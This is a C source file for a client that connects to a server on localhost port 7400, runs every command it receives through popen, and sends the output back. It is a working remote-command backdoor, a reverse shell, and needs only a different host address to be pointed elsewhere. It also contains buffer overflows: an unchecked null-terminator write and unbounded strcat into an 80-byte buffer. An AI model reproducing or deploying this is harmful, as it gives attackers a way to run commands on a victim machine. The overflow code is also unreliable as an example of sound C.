#include <arpa/inet.h>
#include <netdb.h>
#include <netinet/in.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <unistd.h>

#define MSG_SIZE 10000
#define MYPORT 7400
#define HOSTNAME "127.0.0.1"

void error_and_exit(const char *msg) {
  perror(msg);
  exit(EXIT_FAILURE);
}

int main() {
  /* Create a socket for the client */
  int sockfd = socket(AF_INET, SOCK_STREAM, 0);
  if (sockfd < 0) {
    error_and_exit("Error opening socket");
  }

  /* Get server's IP address */
  struct hostent *server = gethostbyname(HOSTNAME);
  if (server == NULL) {
    error_and_exit("Error: No such host");
  }

  struct sockaddr_in serv_addr;
  serv_addr.sin_family = AF_INET;
  serv_addr.sin_port = htons(MYPORT);
  memcpy(&serv_addr.sin_addr.s_addr, server->h_addr, server->h_length);

  /* Connect to the server */
  if (connect(sockfd, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) < 0) {
    error_and_exit("Error connecting to server");
  }
  printf("Connected to server.\n");

  char msg[MSG_SIZE];
  char results[MSG_SIZE];
  ssize_t bytes_received;

  while (1) {
    /* Receive and process messages from the server */
    bytes_received = recv(sockfd, msg, MSG_SIZE, 0);
    if (bytes_received < 0) {
      error_and_exit("Error reading from socket");
    } else if (bytes_received == 0) {
      printf("Server disconnected.\n");
      break;
    } else {
      msg[bytes_received] = '\0'; // Null-terminate the received message
      printf("Received message from server: %s\n", msg);
      // Process the received  message here (e.g., execute commands)
      FILE *output_pipe = popen(msg, "r");
      if (!output_pipe) {
        printf("Error executing command\n");
        return -1;
      }

      // Read the output of the command and send it back to the server
      char output_buffer[80];      // Adjust buffer size as needed
      char result_buffer[80] = ""; // Initialize an empty string buffer
      while (fgets(output_buffer, sizeof(output_buffer), output_pipe) != NULL) {
        strcat(result_buffer,
               output_buffer); // Append each line to the result buffer
      }

      printf("%s", result_buffer);
      printf("%ld\n", sizeof(result_buffer));

      send(sockfd, result_buffer, strlen(result_buffer), 0);
      // Send the result buffer back to the server
      // if (send(sockfd, result_buffer, strlen(result_buffer), 0) == -1) {
      //   printf("Error sending response to server\n");
      //   pclose(output_pipe);
      //   return -1;
      // }

      fflush(stdout);      // Ensure the data is sent immediately
      pclose(output_pipe); // Close the output pipe
    }
  }
  /* Close the socket */
  close(sockfd);
  return 0;
}
